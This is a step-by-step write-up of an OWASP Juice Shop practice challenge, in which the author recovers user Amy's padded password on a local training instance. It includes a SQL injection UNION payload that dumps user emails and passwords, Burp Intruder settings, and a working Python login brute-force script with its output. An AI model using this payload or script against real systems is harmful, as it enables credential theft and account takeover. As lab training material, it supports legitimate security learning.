- First, obtain Amy email by going to [[admin-section]] `amy@juice-sh.op` (using SQL injection like in [[password-strength]] is great too `'))+UNION+SELECT+1,+2,+email,+password,+5,+6,+7,+8,+9+FROM+Users--`. I simply chose the earlier cuz it's convenient)
- "[...] luckily she did not read the "One Important Final Note"
- Search google for "One Important Final Note"
- See that it is a section within Griffiths' [Password Haystacks](https://www.grc.com/haystack.htm?1=) article on the [GRC website](https://www.grc.com/)
- It seems she may use simple padding like `D0g.....................`
- Also, use the `GRC's Interactive Brute Force Password “Search Space” Calculator` to see if that `D0g.....................` equates to "93.83 billion trillion trillion centuries to brute force"
- Bingo
- Let's see if that is also the password that Amy use by trying logging in with the credentials I obtained.
- No luck. But now I know that the password will be 24 characters with 1 uppercase, 1 lowercase, 1 number, and a bunch of dots.
- Let's *stalk* to see who Amy is
- Check the http://localhost:3000/#/photo-wall
- No luck
- With just the name Amy, searching online for just that name is out of the window.
- I guess I will just brute force the first 3 characters at this point.
- I already know that the request is `POST /rest/user/login HTTP/1.1`
- Go to burpsuite
- Send the request to intruder
- Choose Cluster bomb attack
- Set payload positions `{"email":"amy@juice-sh.op","password":"§X§§x§§#§....................."}`
- Choose Brute forcer as `payload type` for all payloads
- Set `min length` and `max length` of all payloads to 1
- In order, the `character set`s are `ABCDEFGHIJKLMNOPQRSTUVWXYZ`, `0123456789`, `abcdefghijklmnopqrstuvwxyz`
- Click start attack
- I grew tired of waiting for the throttled burp so I write my on python script
```
import requests
import string

session = requests.Session()
url = "http://localhost:3000/rest/user/login"
dots = "." * 21

count = 0
for upper in string.ascii_uppercase:
    for lower in string.ascii_lowercase:
        for digit in string.digits:
            pw = f"{upper}{digit}{lower}{dots}"
            count += 1
            if count % 500 == 0:
                print(f"Tried {count} combos... last: {pw}")
            r = session.post(url, json={"email": "amy@juice-sh.op", "password": pw})
            if r.status_code == 200:
                print("FOUND:", pw)
                exit()
print(f"Done. Tried {count} total, no match.")
```

```
$ mkdir owasp-scripts
$ cd owasp-scripts
$ python3 -m venv venv
$ source venv/bin/activate
$ nvim brute-force-amy.py
$ pip install requests
$ python3 brute-force-amy.py
FOUND: K1f.....................
```
- So I know the password is `K1f.....................`
- Complete challenge